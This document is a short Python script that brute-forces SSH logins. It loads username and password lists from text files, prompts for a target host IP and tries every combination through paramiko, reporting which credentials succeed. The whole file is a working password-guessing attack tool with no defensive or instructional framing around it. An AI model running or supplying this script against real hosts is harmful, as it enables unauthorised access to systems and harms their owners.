import paramiko
import time
from colorama import init, Fore

init()

green = Fore.GREEN
red = Fore.RED
blue = Fore.BLUE
reset = Fore.YELLOW

try:
    with open("names.txt", "r") as f:
        names = f.read().split('\n')
except FileNotFoundError:
    print("names.txt not found. Please create it and add your usernames.")
    exit()
try:
    with open("credentials.txt", "r") as f:
        passwds = f.read().split('\n')
except FileNotFoundError:
    print("credentials.txt not found. Please create it and add your passwords.")
    exit()

if len(names) == 1 and names[0] == '':
    print("names.txt is empty. Please add your usernames.")
    exit()
if len(passwds) == 1 and passwds[0] == '':
    print("credentials.txt is empty. Please add your passwords.")
    exit()

def is_ssh_open(hostname, username, passwd):
    client = paramiko.SSHClient()

    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

    try:
        client.connect(hostname, username=username, password=passwd, timeout=5)
        print(green + "Success: " + hostname + " " + username + " " + passwd + reset)
        client.close()
        return True
    except paramiko.AuthenticationException:
        print(red + "Invalid credentials for " + username + ":" + passwd + reset)
        return False

host = input("Host IP: ")

for name in names:
    for passwd in passwds:
        if is_ssh_open(host, name, passwd):
            pass
        else:
            print(red + "Failed: " + name + " " + passwd + reset)
            time.sleep(1)